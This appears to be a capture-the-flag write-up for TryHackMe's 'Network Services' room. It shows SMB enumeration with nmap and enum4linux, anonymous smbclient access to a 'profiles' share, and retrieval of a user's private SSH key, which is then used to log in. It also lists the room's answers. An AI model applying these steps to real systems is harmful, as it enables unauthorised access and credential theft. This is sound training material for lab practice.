![](https://miro.medium.com/max/1400/1*U4H5MEm4rwRy1LPU6SdWyg.png)

This is a writeup for [Network Services](https://tryhackme.com/room/networkservices) room on THM

Enumerating SMB
===============

Spin up your target VM and let’s do a quick nmap scan to find what ports are open

```
$ sudo nmap -Pn -A -sV 10.10.243.160Nmap scan report for 10.10.243.160  
Host is up (0.43s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT    STATE SERVICE     VERSION  
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)  
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)  
|\_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)  
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Network Distance: 4 hops  
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux\_kernelHost script results:  
| smb2-security-mode:   
|   3.1.1:   
|\_    Message signing enabled but not required  
| smb2-time:   
|   date: 2022-02-22T03:00:48  
|\_  start\_date: N/A  
|\_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
| smb-security-mode:   
|   account\_used: guest  
|   authentication\_level: user  
|   challenge\_response: supported  
|\_  message\_signing: disabled (dangerous, but default)  
| smb-os-discovery:   
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)  
|   Computer name: polosmb  
|   NetBIOS computer name: POLOSMB\\x00  
|   Domain name: \\x00  
|   FQDN: polosmb  
|\_  System time: 2022-02-22T03:00:48+00:00
```

‘-Pn’ is used to disable host discovery and nmap is going to assume the host is alive.

‘-sV’ is used to identify the version of service running on the target.

‘-A’ is used for OS Detection.

Now we can answer the below questions

1.  Conduct an **nmap** scan of your choosing, How many ports are open?

```
3
```

2\. What ports is **SMB** running on?

```
139/445
```

We can also find the workgroup name and name of the machine by looking at the nmap scan results without having to use Enum4linux

3\. Let’s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?

```
WORKGROUP
```

4\. What comes up as the **name** of the machine?

```
POLOSMB
```

5\. What operating system **version** is running?

```
6.1
```

Now let’s use enum4linux to find the shares

```
#enum4linux -S 10.10.243.160  
Sharename       Type      Comment  
        ---------       ----      -------  
        netlogon        Disk      Network Logon Service  
        profiles        Disk      Users profiles  
        print$          Disk      Printer Drivers  
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
```

‘-S’ is used to get sharelist

6\. What share sticks out as something we might want to investigate?

```
profiles
```

Exploiting SMB
==============

**Method Breakdown  
**So, from our enumeration stage, we know:  
\- The SMB share location  
\- The name of an interesting SMB share

SMBClient
---------

Because we’re trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it’s part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.  
We can remotely access the SMB share using the syntax:

```
smbclient //\[IP\]/\[SHARE\]
```

Followed by the tags:  
\-U \[name\] : to specify the user  
\-p \[port\] : to specify the port  
Got it? Okay, let’s do this!

1.  What would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port?

```
smbclient //10.10.10.2/secret -U suit -p 445
```

Now let’s try to connect to our target VM to access the shares we are interested in, Since we don't know what the username of the system is so we are going to leave that part and try to connect anonymously.

```
smbclient //10.10.243.160/profiles -p 445
```

we don't have to type a password we can get in just by hitting enter

```
Enter WORKGROUP\\kali's password:   
Try "help" to get a list of possible commands.  
smb: \\>
```

3\. Does the share allow anonymous access? Y/N?

```
Y
```

type ‘help’ in the prompt to see the list of all available commands

```
smb: \\> help  
?              allinfo        altname        archive        backup           
blocksize      cancel         case\_sensitive cd             chmod            
chown          close          del            deltree        dir              
du             echo           exit           get            getfacl          
geteas         hardlink       help           history        iosize           
lcd            link           lock           lowercase      ls               
l              mask           md             mget           mkdir            
more           mput           newer          notify         open             
posix          posix\_encrypt  posix\_open     posix\_mkdir    posix\_rmdir      
posix\_unlink   posix\_whoami   print          prompt         put              
pwd            q              queue          quit           readlink         
rd             recurse        reget          rename         reput            
rm             rmdir          showacls       setea          setmode          
scopy          stat           symlink        tar            tarmode          
timeout        translate      unlock         volume         vuid             
wdel           logon          listconnect    showconnect    tcon             
tdis           tid            utimes         logoff         ..               
! 
```

enter ‘ls’ to list the files

```
smb: \\> ls  
  .                                   D        0  Tue Apr 21 07:08:23 2020  
  ..                                  D        0  Tue Apr 21 06:49:56 2020  
  .cache                             DH        0  Tue Apr 21 07:08:23 2020  
  .profile                            H      807  Tue Apr 21 07:08:23 2020  
  .sudo\_as\_admin\_successful           H        0  Tue Apr 21 07:08:23 2020  
  .bash\_logout                        H      220  Tue Apr 21 07:08:23 2020  
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020  
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020  
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020  
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020  
  .gnupg                             DH        0  Tue Apr 21 07:08:23 202012316808 blocks of size 1024. 7584024 blocks available
```

The file that looks interesting is “Working From Home Information.txt”  
to view the contents of the file

```
smb: \\> more "Working From Home Information.txt"
```

and we get the following information

![](https://miro.medium.com/max/1400/1*wAyJgO6mj-ltHKvulUx2JA.png)

hit SHIFT + Q to come back

4\. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

```
John Cactus
```

5\. What service has been configured to allow him to work from home?

```
SSH
```

6\. Okay! Now we know this, what directory on the share should we look in?

```
.ssh
```

let’s open .ssh folder and see what’s inside

```
smb: \\> cd .ssh  
smb: \\.ssh\\> ls  
  .                                   D        0  Tue Apr 21 07:08:23 2020  
  ..                                  D        0  Tue Apr 21 07:08:23 2020  
  id\_rsa                              A     1679  Tue Apr 21 07:08:23 2020  
  id\_rsa.pub                          N      396  Tue Apr 21 07:08:23 2020  
  authorized\_keys                     N        0  Tue Apr 21 07:08:23 202012316808 blocks of size 1024. 7584024 blocks available
```

we can see the public keys for SSH in that folder, and we can also find SSH username by opening the ‘id\_rsa.pub’ file

use ‘mget’ to download files from SMB

```
smb: \\> mget .ssh/id\_rsa\*  
Get file id\_rsa? yes  
getting file \\.ssh\\id\_rsa of size 1679 as .ssh/id\_rsa (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)  
Get file id\_rsa.pub? yes  
getting file \\.ssh\\id\_rsa.pub of size 396 as .ssh/id\_rsa.pub (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)  
smb: \\>
```

Type ‘exit’ to logoff

now we must change the file permissions (read and write) of id\_rsa file to SSH as John Cactus

```
chmod 600 id\_rsa
```

Now let’s connect

```
ssh -i id\_rsa cactus@10.10.243.160
```

and we logged in, Answer to the last question is found in smb.txt

```
cat smb.txt
```

Thank you for reading.
